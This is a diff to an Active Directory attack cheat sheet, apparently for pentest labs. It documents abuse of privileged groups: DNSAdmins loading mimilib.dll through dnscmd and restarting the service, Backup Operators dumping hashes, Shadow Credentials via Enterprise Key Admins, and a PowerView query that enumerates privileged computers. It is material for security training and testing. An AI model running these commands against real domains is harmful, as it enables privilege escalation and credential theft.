@@ -10,6 +10,7 @@
   * [Backup Operators](#Backup-Operators)
   * [Account Operators](#Account-Operators)
   * [DNS Admins](#DNS-Admins)
+  * [Computers with high privileges](#Computers-with-high-privileges)
 * [Access Control List(ACL)](#Access-Control-List)
   * [Check specific ACL permissions](#Specific-ACL-permissions)
   * [ACL-abuses](#ACL-abuses)
@@ -267,7 +268,7 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ## High Privileged Groups
 - Default Administrators, Domain Admins and Enterprise Admins "super" groups.
 - Server Operators, Members are allowed to log onto DCs locally and can modify services, access SMB shares, and backup files.
-- Backup Operators, 	Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
+- Backup Operators, Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.
 - Print Operators,	Members are allowed to logon to DCs locally and "trick" Windows into loading a malicious driver.
 - Hyper-V Administrators, If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.
 - Account Operators,	Members can modify non-protected accounts and groups in the domain.
@@ -276,6 +277,7 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 - Group Policy Creator Owners,	Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.
 - Schema Admins,	Members can modify the Active Directory schema structure and can backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.
 - DNS Admins,	Members have the ability to load a DLL on a DC but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.
+- Enterprise Key Admins, Members have the ability to write to the “msds-KeyCredentialLink” property on a user or computer. Writing to this property allows an attacker to create “Shadow Credentials” on the object and authenticate as the principal using kerberos PKINIT.
 
 ### Backup Operators
 - Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. 
@@ -310,27 +312,35 @@ secretsdump.py '<DOMAIN>/<DC COMPUTERACCONT NAME>$'@<DC FQDN> -hashes <LM HASH>:
 ```
 
 ### Account Operators
-The group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. By default it has no direct path to Domain Admin, but these groups might be able to add members to other groups which have other ACL's etc. In this lab (as far as I know) you cant become DA with these privileges.
+The group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. By default it has no direct path to Domain Admin, but these groups might be able to add members to other groups which have other ACL's etc.
 
 Paths to domain admins can be created if Exchange is installed for example since the Account Operator group can manage Exchange groups which have high privileges to the domain object. If they are created high privileged groups within the domain, there is a big chance that there is a path to gain access to other machines or domain admins using this group!
 
 ### DNS Admins
 #### Enumerate member of the DNS admin group
 ```
-Get-NetGRoupMember “DNSAdmins”
+Get-DomainGroupMember "DNSAdmins"
 ```
 
 #### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
 Share the directory the ddl is in for everyone so its accessible.
 logs all DNS queries on C:\Windows\System32\kiwidns.log 
 ```
-Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
+dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
 ```
 
 #### Restart DNS
 ```
-Sc \\<dns server> stop dns
-Sc \\<dns server> start dns
+sc \\<dns server> stop dns
+sc \\<dns server> start dns
+```
+
+### Computers with high privileges
+- Computerobjects part of a high privileged group have the same permissions as users part of the group.
+
+#### Enumerate computers part of high privileged groups
+```
+Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse -ErrorAction Silentlycontinue -WarningAction Silentlycontinue | Where-Object -Property MemberObjectClass -Match computer | Select-Object MemberName
 ```
 
 ## Access Control List
